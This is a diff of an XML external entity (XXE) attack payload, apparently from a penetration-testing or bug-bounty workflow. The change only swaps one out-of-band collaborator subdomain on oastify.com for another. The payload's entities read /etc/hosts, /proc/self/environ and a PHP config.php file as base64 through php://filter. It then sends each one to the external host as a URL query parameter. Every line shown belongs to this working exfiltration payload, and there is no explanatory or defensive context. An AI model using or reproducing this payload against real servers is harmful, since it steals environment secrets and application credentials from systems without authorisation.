@@ -5,11 +5,11 @@
   <!ENTITY % remote3 SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts">
   <!ENTITY % remote4 SYSTEM "php://filter/read=convert.base64-encode/resource=file:///proc/self/environ">
   <!ENTITY % remote5 SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/config.php">
-  <!ENTITY % inject "<!ENTITY send1 SYSTEM 'http://zfin3jcfpvzlizl1fiam3tzppgv7j37s.oastify.com?data=%remote1;'>">
-  <!ENTITY % inject2 "<!ENTITY send2 SYSTEM 'http://zfin3jcfpvzlizl1fiam3tzppgv7j37s.oastify.com?data=%remote2;'>">
-  <!ENTITY % inject3 "<!ENTITY send3 SYSTEM 'http://zfin3jcfpvzlizl1fiam3tzppgv7j37s.oastify.com?data=%remote3;'>">
-  <!ENTITY % inject4 "<!ENTITY send4 SYSTEM 'http://zfin3jcfpvzlizl1fiam3tzppgv7j37s.oastify.com?data=%remote4;'>">
-  <!ENTITY % inject5 "<!ENTITY send5 SYSTEM 'http://zfin3jcfpvzlizl1fiam3tzppgv7j37s.oastify.com?data=%remote5;'>">
+  <!ENTITY % inject "<!ENTITY send1 SYSTEM 'http://tdah1da9npxfgtjvdc8g1nxjnat1h15q.oastify.com?data=%remote1;'>">
+  <!ENTITY % inject2 "<!ENTITY send2 SYSTEM 'http://tdah1da9npxfgtjvdc8g1nxjnat1h15q.oastify.com?data=%remote2;'>">
+  <!ENTITY % inject3 "<!ENTITY send3 SYSTEM 'http://tdah1da9npxfgtjvdc8g1nxjnat1h15q.oastify.com?data=%remote3;'>">
+  <!ENTITY % inject4 "<!ENTITY send4 SYSTEM 'http://tdah1da9npxfgtjvdc8g1nxjnat1h15q.oastify.com?data=%remote4;'>">
+  <!ENTITY % inject5 "<!ENTITY send5 SYSTEM 'http://tdah1da9npxfgtjvdc8g1nxjnat1h15q.oastify.com?data=%remote5;'>">
   %inject;
   %inject2;
   %inject3;
